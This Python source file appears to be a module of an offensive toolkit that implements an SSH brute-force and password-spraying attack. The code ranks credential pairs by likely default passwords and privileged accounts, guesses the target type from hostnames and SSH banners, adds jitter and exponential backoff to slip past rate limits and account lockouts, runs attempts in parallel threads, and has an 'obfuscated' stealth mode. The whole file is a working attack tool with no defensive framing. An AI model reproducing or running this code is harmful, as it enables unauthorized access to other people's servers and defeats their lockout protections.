import time
import random
import logging
import socket
import re
from typing import List, Optional, Tuple, Dict
from concurrent.futures import ThreadPoolExecutor, as_completed
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, SSHException, NoValidConnectionsError
from core.connector import SSHConnector
from core.utils import Utils
from core.obfuscator import Obfuscator
from colorama import Fore, Back, Style

class BruteForceUI:
    """Stylish UI for brute force attacks"""
    
    @staticmethod
    def print_attack_header(host: str, mode: str, user_count: int, pass_count: int):
        """Display attack header with statistics"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    {Fore.RED}SSH Brute Force Attack{Fore.CYAN}                    ║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        print(f"║ {Fore.YELLOW}Target:{Style.RESET_ALL} {host:<47} ║")
        print(f"║ {Fore.YELLOW}Mode:{Style.RESET_ALL} {mode:<49} ║")
        print(f"║ {Fore.YELLOW}Users:{Style.RESET_ALL} {user_count:<47} ║")
        print(f"║ {Fore.YELLOW}Passwords:{Style.RESET_ALL} {pass_count:<43} ║")
        print(f"║ {Fore.YELLOW}Total Attempts:{Style.RESET_ALL} {user_count * pass_count:<37} ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")

    @staticmethod
    def print_context_detection(context: str, banner: str = None):
        """Display target context detection results"""
        print(f"{Fore.BLUE}[INFO] Target Analysis:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}Context:{Style.RESET_ALL} {context}")
        if banner:
            print(f"  {Fore.CYAN}Banner:{Style.RESET_ALL} {banner[:60]}...")
        print()

    @staticmethod
    def print_credential_scores(scored_items: List[Tuple], item_type: str = "passwords"):
        """Display top credential scores"""
        print(f"{Fore.BLUE}[INFO] Top 5 {item_type.title()} by Score:{Style.RESET_ALL}")
        for i, (item, score) in enumerate(scored_items[:5], 1):
            color = Fore.GREEN if score >= 80 else Fore.YELLOW if score >= 50 else Fore.RED
            print(f"  {i}. {color}{item}{Style.RESET_ALL} (Score: {score})")
        print()

    @staticmethod
    def print_progress(attempt: int, total: int, current_cred: str, success: bool = False):
        """Display progress with current credential"""
        percent = (attempt / total) * 100
        bar_length = 40
        filled = int(bar_length * attempt // total)
        bar = "█" * filled + "░" * (bar_length - filled)
        
        status = f"{Fore.GREEN}SUCCESS!{Style.RESET_ALL}" if success else f"{Fore.YELLOW}Testing{Style.RESET_ALL}"
        print(f"\r{Fore.CYAN}[{percent:5.1f}%] {bar} {status} {current_cred[:30]:<30}", end="")
        
        if success or attempt == total:
            print()

    @staticmethod
    def print_success(username: str, password: str, score: int = None):
        """Display successful credential discovery"""
        print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                        {Fore.WHITE}SUCCESS!{Fore.GREEN}                        ║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        print(f"║ {Fore.YELLOW}Username:{Style.RESET_ALL} {username:<45} ║")
        print(f"║ {Fore.YELLOW}Password:{Style.RESET_ALL} {password:<44} ║")
        if score:
            print(f"║ {Fore.YELLOW}Score:{Style.RESET_ALL} {score:<47} ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")

    @staticmethod
    def print_stats(stats: Dict):
        """Display attack statistics"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                        {Fore.YELLOW}Attack Statistics{Fore.CYAN}                        ║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        print(f"║ {Fore.GREEN}Attempts:{Style.RESET_ALL} {stats.get('attempts', 0):<45} ║")
        print(f"║ {Fore.GREEN}Successes:{Style.RESET_ALL} {stats.get('successes', 0):<44} ║")
        print(f"║ {Fore.YELLOW}Lockouts:{Style.RESET_ALL} {stats.get('lockouts', 0):<44} ║")
        print(f"║ {Fore.RED}Errors:{Style.RESET_ALL} {stats.get('connection_errors', 0):<46} ║")
        print(f"║ {Fore.MAGENTA}Duration:{Style.RESET_ALL} {stats.get('duration', 0):.1f}s{Fore.CYAN:<42} ║")
        print(f"║ {Fore.BLUE}Rate:{Style.RESET_ALL} {stats.get('rate', 0):.1f} attempts/sec{Fore.CYAN:<35} ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

class CredentialScorer:
    """Score credentials based on likelihood of success"""
    
    def __init__(self):
        # Common password patterns and their scores
        self.password_patterns = {
            # Very common passwords (high score)
            r'^(password|123456|admin|root|qwerty|letmein)$': 100,
            r'^(password\d+|admin\d+|root\d+)$': 95,
            r'^(123456789|12345678|1234567|123456)$': 90,
            r'^(qwertyuiop|asdfghjkl|zxcvbnm)$': 85,
            
            # Common variations (medium-high score)
            r'^(password|admin|root|user|test|guest|demo)$': 80,
            r'^[a-z]{3,8}$': 75,  # Simple lowercase words
            r'^\d{4,8}$': 70,      # Numeric sequences
            
            # Date patterns (medium score)
            r'^(19|20)\d{2}$': 65,  # Years
            r'^\d{1,2}\d{1,2}\d{2,4}$': 60,  # Date formats
            
            # Common substitutions (medium score)
            r'^[a-z]+[0-9]+$': 55,  # word + numbers
            r'^[0-9]+[a-z]+$': 55,  # numbers + word
            r'^[a-z]+[!@#$%^&*]+$': 50,  # word + symbols
            
            # Username-based patterns (high score)
            r'^[a-z]+$': 45,  # Simple lowercase
            r'^[A-Z][a-z]+$': 40,  # Capitalized
            r'^[a-z]+[0-9]{1,3}$': 35,  # username + numbers
            
            # Default/empty passwords (very high score)
            r'^$': 110,  # Empty password
            r'^(default|changeme|welcome|newpass)$': 105,
            
            # Service-specific passwords (high score)
            r'^(cisco|juniper|hpe|dell|ibm|oracle)$': 90,
            r'^(ubuntu|centos|debian|redhat|fedora)$': 85,
            r'^(mysql|postgres|oracle|sql)$': 80,
        }
        
        # Common username patterns
        self.username_patterns = {
            # Privileged accounts (high priority)
            r'^(root|admin|administrator|superuser)$': 100,
            r'^(ubuntu|centos|debian|redhat|fedora)$': 90,
            r'^(cisco|juniper|hpe|dell|ibm|oracle)$': 85,
            
            # Common service accounts
            r'^(mysql|postgres|oracle|sql|web|www|ftp|mail)$': 75,
            r'^(user|test|guest|demo|temp|backup)$': 70,
            
            # Common personal accounts
            r'^(john|jane|bob|alice|mike|sarah|david|lisa)$': 60,
            r'^(admin\d+|user\d+|test\d+)$': 55,
        }
        
        # Target-specific scoring adjustments
        self.target_contexts = {
            'web_server': {
                'high_priority_users': ['www', 'web', 'apache', 'nginx'],
                'high_priority_passwords': ['webpass', 'server', 'hosting']
            },
            'database_server': {
                'high_priority_users': ['mysql', 'postgres', 'oracle', 'db'],
                'high_priority_passwords': ['dbpass', 'database', 'sql']
            },
            'network_device': {
                'high_priority_users': ['cisco', 'juniper', 'admin', 'root'],
                'high_priority_passwords': ['cisco', 'juniper', 'router', 'switch']
            }
        }

    def score_password(self, password: str, context: str = None) -> int:
        """Score a password based on likelihood of success"""
        if not password:
            return 110  # Empty password is very common
            
        password_lower = password.lower()
        base_score = 10  # Default score
        
        # Check against patterns
        for pattern, score in self.password_patterns.items():
            if re.match(pattern, password_lower):
                base_score = max(base_score, score)
                break
        
        # Context-specific scoring
        if context and context in self.target_contexts:
            context_passwords = self.target_contexts[context]['high_priority_passwords']
            if password_lower in context_passwords:
                base_score = max(base_score, 95)
        
        # Length-based adjustments
        if len(password) <= 4:
            base_score += 20  # Very short passwords are common
        elif len(password) <= 6:
            base_score += 10
        elif len(password) >= 20:
            base_score -= 10  # Very long passwords are less common
        
        # Character complexity adjustments
        if password.isdigit():
            base_score += 15  # Numeric passwords are common
        elif password.isalpha():
            base_score += 10  # Alphabetic passwords are common
        elif password.islower():
            base_score += 5   # Lowercase is more common
        
        return min(base_score, 100)  # Cap at 100

    def score_username(self, username: str, context: str = None) -> int:
        """Score a username based on likelihood of existence"""
        if not username:
            return 0
            
        username_lower = username.lower()
        base_score = 10
        
        # Check against patterns
        for pattern, score in self.username_patterns.items():
            if re.match(pattern, username_lower):
                base_score = max(base_score, score)
                break
        
        # Context-specific scoring
        if context and context in self.target_contexts:
            context_users = self.target_contexts[context]['high_priority_users']
            if username_lower in context_users:
                base_score = max(base_score, 95)
        
        return min(base_score, 100)

    def prioritize_credentials(self, usernames: List[str], passwords: List[str], 
                             context: str = None) -> List[Tuple[str, str, int]]:
        """Prioritize credential pairs by combined score"""
        prioritized = []
        
        for username in usernames:
            user_score = self.score_username(username, context)
            for password in passwords:
                pass_score = self.score_password(password, context)
                # Combined score (username + password)
                combined_score = (user_score + pass_score) // 2
                prioritized.append((username, password, combined_score))
        
        # Sort by score (highest first)
        prioritized.sort(key=lambda x: x[2], reverse=True)
        return prioritized

    def detect_target_context(self, host: str, banner: str = None) -> str:
        """Detect target context based on hostname and SSH banner"""
        if not host and not banner:
            return 'unknown'
            
        host_lower = host.lower()
        banner_lower = (banner or '').lower()
        
        # Web server indicators
        if any(x in host_lower for x in ['web', 'www', 'http', 'apache', 'nginx']):
            return 'web_server'
        if any(x in banner_lower for x in ['apache', 'nginx', 'web']):
            return 'web_server'
            
        # Database server indicators
        if any(x in host_lower for x in ['db', 'mysql', 'postgres', 'oracle', 'sql']):
            return 'database_server'
        if any(x in banner_lower for x in ['mysql', 'postgres', 'oracle']):
            return 'database_server'
            
        # Network device indicators
        if any(x in host_lower for x in ['router', 'switch', 'firewall', 'cisco', 'juniper']):
            return 'network_device'
        if any(x in banner_lower for x in ['cisco', 'juniper', 'router']):
            return 'network_device'
            
        return 'unknown'

class SSHBruteForce:
    """Advanced SSH brute force attack module with multiple techniques"""

    def __init__(self, config: Dict):
        self.config = config
        self.connector = SSHConnector(config)
        self.obfuscator = Obfuscator(config)
        self.scorer = CredentialScorer()
        self.ui = BruteForceUI()
        self.timeout = config.get('timeout', 10)
        self.max_threads = config.get('max_threads', 5)
        self.delay = config.get('delay', 2.0)
        self.jitter = config.get('jitter', 0.5)
        self.current_target = None
        self.lockout_detected = False
        self.connection_errors = 0
        self.max_retries = config.get('max_retries', 3)
        self.backoff_factor = config.get('backoff_factor', 2.0)
        self.server_responses = {
            'timeouts': 0,
            'refused': 0,
            'auth_failures': 0,
            'rate_limits': 0
        }
        self.stats = {
            'attempts': 0,
            'successes': 0,
            'lockouts': 0,
            'connection_errors': 0,
            'retries': 0,
            'start_time': time.time()
        }

    def _calculate_delay(self) -> float:
        """Calculate delay with random jitter and adaptive backoff"""
        base_delay = self.delay
        
        # Adaptive delay based on server responses
        if self.server_responses['rate_limits'] > 5:
            base_delay *= 2
        if self.server_responses['timeouts'] > 3:
            base_delay *= 1.5
            
        return max(0, base_delay + random.uniform(-self.jitter, self.jitter))

    def _handle_lockout(self):
        """Handle account lockout conditions with exponential backoff"""
        self.lockout_detected = True
        self.stats['lockouts'] += 1
        lockout_delay = self.config.get('lockout_delay', 300)
        
        # Exponential backoff for repeated lockouts
        if self.stats['lockouts'] > 1:
            lockout_delay *= (self.backoff_factor ** (self.stats['lockouts'] - 1))
        
        print(f"{Fore.YELLOW}[WARNING] Account lockout detected. Sleeping for {lockout_delay:.1f} seconds{Style.RESET_ALL}")
        time.sleep(lockout_delay)
        self.lockout_detected = False

    def _handle_connection_error(self, error: Exception) -> bool:
        """Handle connection errors and determine if retry is needed"""
        error_str = str(error).lower()
        
        # Categorize errors
        if "timeout" in error_str or "timed out" in error_str:
            self.server_responses['timeouts'] += 1
            print(f"{Fore.MAGENTA}[DEBUG] Connection timeout: {error}{Style.RESET_ALL}")
            return True  # Retry timeout errors
            
        elif "connection refused" in error_str or "no route to host" in error_str:
            self.server_responses['refused'] += 1
            print(f"{Fore.MAGENTA}[DEBUG] Connection refused: {error}{Style.RESET_ALL}")
            return False  # Don't retry connection refused
            
        elif "authentication failed" in error_str:
            self.server_responses['auth_failures'] += 1
            return False  # Normal auth failure, don't retry
            
        elif "rate limit" in error_str or "too many attempts" in error_str:
            self.server_responses['rate_limits'] += 1
            print(f"{Fore.YELLOW}[WARNING] Rate limiting detected: {error}{Style.RESET_ALL}")
            return True  # Retry after delay
            
        elif "connection reset" in error_str:
            print(f"{Fore.MAGENTA}[DEBUG] Connection reset: {error}{Style.RESET_ALL}")
            return True  # Retry connection resets
            
        else:
            print(f"{Fore.MAGENTA}[DEBUG] Unknown connection error: {error}{Style.RESET_ALL}")
            return True  # Retry unknown errors

    def _try_credentials_with_recovery(self, host: str, username: str, password: str) -> Optional[Tuple[str, str]]:
        """Attempt single credential pair with enhanced error recovery"""
        if self.lockout_detected:
            return None

        self.stats['attempts'] += 1
        retry_count = 0
        
        while retry_count <= self.max_retries:
            try:
                result = self.connector.connect_with_password(host, username, password)
                if result.success:
                    self.stats['successes'] += 1
                    return (username, password)
                return None  # Normal auth failure
                
            except AuthenticationException as e:
                error_str = str(e).lower()
                if "password authentication failed" in error_str:
                    return None  # Normal failure, no retry
                elif "account locked" in error_str or "account disabled" in error_str:
                    self._handle_lockout()
                    return None
                elif "too many authentication failures" in error_str:
                    self.server_responses['rate_limits'] += 1
                    print(f"{Fore.YELLOW}[WARNING] Rate limiting detected: {e}{Style.RESET_ALL}")
                    time.sleep(self._calculate_delay() * 2)  # Longer delay for rate limits
                    retry_count += 1
                    continue
                    
            except SSHException as e:
                if self._handle_connection_error(e):
                    retry_count += 1
                    if retry_count <= self.max_retries:
                        self.stats['retries'] += 1
                        delay = self._calculate_delay() * (self.backoff_factor ** retry_count)
                        print(f"{Fore.MAGENTA}[DEBUG] Retrying in {delay:.1f}s (attempt {retry_count}/{self.max_retries}){Style.RESET_ALL}")
                        time.sleep(delay)
                        continue
                break
                
            except (socket.timeout, socket.error) as e:
                self.stats['connection_errors'] += 1
                if retry_count < self.max_retries:
                    retry_count += 1
                    self.stats['retries'] += 1
                    delay = self._calculate_delay() * (self.backoff_factor ** retry_count)
                    print(f"{Fore.MAGENTA}[DEBUG] Network error, retrying in {delay:.1f}s: {e}{Style.RESET_ALL}")
                    time.sleep(delay)
                    continue
                break
                
            except Exception as e:
                print(f"{Fore.MAGENTA}[DEBUG] Unexpected error: {str(e)}{Style.RESET_ALL}")
                break

        time.sleep(self._calculate_delay())
        return None

    def _try_credentials(self, host: str, username: str, password: str) -> Optional[Tuple[str, str]]:
        """Legacy method - now calls enhanced version"""
        return self._try_credentials_with_recovery(host, username, password)

    def _check_connection_health(self, host: str) -> bool:
        """Check if target is reachable and SSH is available"""
        try:
            # Quick connection test without authentication
            test_client = SSHClient()
            test_client.set_missing_host_key_policy(AutoAddPolicy())
            test_client.connect(host, port=22, timeout=5, banner_timeout=10)
            test_client.close()
            return True
        except Exception as e:
            print(f"{Fore.YELLOW}[WARNING] Target {host} appears unreachable: {e}{Style.RESET_ALL}")
            return False

    def _recover_from_failure(self, host: str) -> bool:
        """Attempt to recover from repeated failures"""
        if self.connection_errors > 10:
            print(f"{Fore.YELLOW}[WARNING] Too many connection errors for {host}, pausing...{Style.RESET_ALL}")
            time.sleep(60)  # Long pause
            self.connection_errors = 0
            return True
            
        if self.server_responses['rate_limits'] > 5:
            print(f"{Fore.YELLOW}[WARNING] Rate limiting detected for {host}, increasing delays...{Style.RESET_ALL}")
            self.delay *= 2
            self.server_responses['rate_limits'] = 0
            return True
            
        return False

    def _get_target_banner(self, host: str) -> Optional[str]:
        """Get SSH banner to help with context detection"""
        try:
            test_client = SSHClient()
            test_client.set_missing_host_key_policy(AutoAddPolicy())
            test_client.connect(host, port=22, timeout=5, banner_timeout=10)
            transport = test_client.get_transport()
            banner = transport.get_banner() if transport else None
            test_client.close()
            return banner
        except Exception:
            return None

    def brute_force_single(self, host: str, username: str, passwords: List[str]) -> Optional[Tuple[str, str]]:
        """Brute force single user with prioritized password list"""
        print(f"{Fore.BLUE}[INFO] Starting brute force against {username}@{host} with {len(passwords)} passwords{Style.RESET_ALL}")
        
        # Check connection health first
        if not self._check_connection_health(host):
            print(f"{Fore.RED}[ERROR] Cannot reach {host}, skipping...{Style.RESET_ALL}")
            return None
        
        # Get target context for scoring
        banner = self._get_target_banner(host)
        context = self.scorer.detect_target_context(host, banner)
        self.ui.print_context_detection(context, banner)
        
        # Prioritize passwords by likelihood
        scored_passwords = [(pwd, self.scorer.score_password(pwd, context)) for pwd in passwords]
        scored_passwords.sort(key=lambda x: x[1], reverse=True)
        
        self.ui.print_credential_scores(scored_passwords, "passwords")
        
        for i, (password, score) in enumerate(scored_passwords):
            # Periodic health checks
            if i % 50 == 0 and i > 0:
                if not self._check_connection_health(host):
                    print(f"{Fore.YELLOW}[WARNING] Target {host} became unreachable, stopping...{Style.RESET_ALL}")
                    break
                    
            # Update progress
            current_cred = f"{username}:{password[:10]}..."
            self.ui.print_progress(i + 1, len(scored_passwords), current_cred)
            
            result = self._try_credentials_with_recovery(host, username, password)
            if result:
                self.ui.print_success(username, password, score)
                return result
                
            if self.lockout_detected:
                print(f"{Fore.YELLOW}[WARNING] Account lockout detected for {username}, stopping...{Style.RESET_ALL}")
                break
                
            # Recovery check
            if self._recover_from_failure(host):
                continue
                
        return None

    def spray_attack(self, host: str, usernames: List[str], passwords: List[str]) -> Optional[Tuple[str, str]]:
        """Password spraying attack with prioritized credentials"""
        print(f"{Fore.BLUE}[INFO] Starting spray attack against {host} with {len(usernames)} users and {len(passwords)} passwords{Style.RESET_ALL}")
        
        # Check connection health first
        if not self._check_connection_health(host):
            print(f"{Fore.RED}[ERROR] Cannot reach {host}, skipping...{Style.RESET_ALL}")
            return None
        
        # Get target context for scoring
        banner = self._get_target_banner(host)
        context = self.scorer.detect_target_context(host, banner)
        self.ui.print_context_detection(context, banner)
        
        # Prioritize all credential combinations
        prioritized_creds = self.scorer.prioritize_credentials(usernames, passwords, context)
        self.ui.print_credential_scores(prioritized_creds[:5], "credentials")
        
        for i, (username, password, score) in enumerate(prioritized_creds):
            # Update progress
            current_cred = f"{username}:{password[:10]}..."
            self.ui.print_progress(i + 1, len(prioritized_creds), current_cred)
            
            result = self._try_credentials_with_recovery(host, username, password)
            if result:
                self.ui.print_success(username, password, score)
                return result
                
            if self.lockout_detected:
                print(f"{Fore.YELLOW}[WARNING] Account lockout detected, stopping spray attack...{Style.RESET_ALL}")
                return None
                
            # Recovery check
            if self._recover_from_failure(host):
                continue
                
        return None

    def threaded_bruteforce(self, host: str, cred_list: List[Tuple[str, str]]) -> Optional[Tuple[str, str]]:
        """Multi-threaded brute force attack with prioritized credentials"""
        print(f"{Fore.BLUE}[INFO] Starting threaded attack with {len(cred_list)} credentials across {self.max_threads} threads{Style.RESET_ALL}")
        
        # Check connection health first
        if not self._check_connection_health(host):
            print(f"{Fore.RED}[ERROR] Cannot reach {host}, skipping...{Style.RESET_ALL}")
            return None
        
        # Get target context for scoring
        banner = self._get_target_banner(host)
        context = self.scorer.detect_target_context(host, banner)
        self.ui.print_context_detection(context, banner)
        
        # Prioritize credentials
        prioritized_creds = []
        for username, password in cred_list:
            score = (self.scorer.score_username(username, context) + 
                    self.scorer.score_password(password, context)) // 2
            prioritized_creds.append((username, password, score))
        
        prioritized_creds.sort(key=lambda x: x[2], reverse=True)
        self.ui.print_credential_scores(prioritized_creds[:5], "credentials")
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {
                executor.submit(self._try_credentials_with_recovery, host, user, pwd): (user, pwd, score)
                for user, pwd, score in prioritized_creds
            }
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        executor.shutdown(wait=False)
                        return result
                except Exception as e:
                    print(f"{Fore.MAGENTA}[DEBUG] Thread error: {e}{Style.RESET_ALL}")
                    continue
                    
        return None

    def smart_bruteforce(self, host: str, username_list: List[str], password_list: List[str]) -> Optional[Tuple[str, str]]:
        """Adaptive brute force with credential prioritization"""
        # Check connection health first
        if not self._check_connection_health(host):
            print(f"{Fore.RED}[ERROR] Cannot reach {host}, skipping...{Style.RESET_ALL}")
            return None
            
        # Get target context for scoring
        banner = self._get_target_banner(host)
        context = self.scorer.detect_target_context(host, banner)
        self.ui.print_context_detection(context, banner)
        
        # Try spraying first with top passwords
        top_passwords = password_list[:10]
        result = self.spray_attack(host, username_list, top_passwords)
        if result:
            return result

        # If spraying fails, try targeted attacks on privileged accounts
        privileged_users = [u for u in username_list if u in ['root', 'admin', 'ubuntu']]
        if privileged_users:
            result = self.brute_force_single(host, random.choice(privileged_users), password_list)
            if result:
                return result

        # Fall back to full threaded attack
        cred_pairs = [(u, p) for u in username_list for p in password_list]
        return self.threaded_bruteforce(host, cred_pairs)

    def get_stats(self) -> Dict:
        """Get current attack statistics with enhanced metrics"""
        self.stats['duration'] = time.time() - self.stats['start_time']
        self.stats['rate'] = self.stats['attempts'] / max(1, self.stats['duration'])
        self.stats['success_rate'] = self.stats['successes'] / max(1, self.stats['attempts'])
        self.stats['error_rate'] = self.stats['connection_errors'] / max(1, self.stats['attempts'])
        self.stats['server_responses'] = self.server_responses.copy()
        return self.stats

    def reset_stats(self):
        """Reset all statistics and counters"""
        self.stats = {
            'attempts': 0,
            'successes': 0,
            'lockouts': 0,
            'connection_errors': 0,
            'retries': 0,
            'start_time': time.time()
        }
        self.server_responses = {
            'timeouts': 0,
            'refused': 0,
            'auth_failures': 0,
            'rate_limits': 0
        }
        self.connection_errors = 0
        self.lockout_detected = False

    def obfuscated_bruteforce(self, host: str, username: str, password_list: List[str]) -> Optional[Tuple[str, str]]:
        """Brute force with command obfuscation for stealth"""
        obfuscated_user = self.obfuscator.obfuscate_command(username)
        for password in password_list:
            obfuscated_pass = self.obfuscator.obfuscate_command(password)
            result = self._try_credentials_with_recovery(host, obfuscated_user, obfuscated_pass)
            if result:
                return (username, password)  # Return original credentials
        return None

    def run(self, host: str, username_list: List[str], password_list: List[str], mode: str = "smart") -> Optional[Tuple[str, str]]:
        """Main execution method with enhanced error handling and credential prioritization"""
        self.current_target = host
        self.reset_stats()  # Reset stats for new target
        
        # Display attack header
        self.ui.print_attack_header(host, mode, len(username_list), len(password_list))
        
        try:
            if mode == "spray":
                return self.spray_attack(host, username_list, password_list)
            elif mode == "single":
                return self.brute_force_single(host, username_list[0], password_list)
            elif mode == "threaded":
                cred_pairs = [(u, p) for u in username_list for p in password_list]
                return self.threaded_bruteforce(host, cred_pairs)
            elif mode == "obfuscated":
                return self.obfuscated_bruteforce(host, username_list[0], password_list)
            else:  # smart mode
                return self.smart_bruteforce(host, username_list, password_list)
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}[INFO] Attack interrupted by user{Style.RESET_ALL}")
            return None
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Unexpected error during attack: {e}{Style.RESET_ALL}")
            return None
        finally:
            # Display final statistics
            stats = self.get_stats()
            self.ui.print_stats(stats)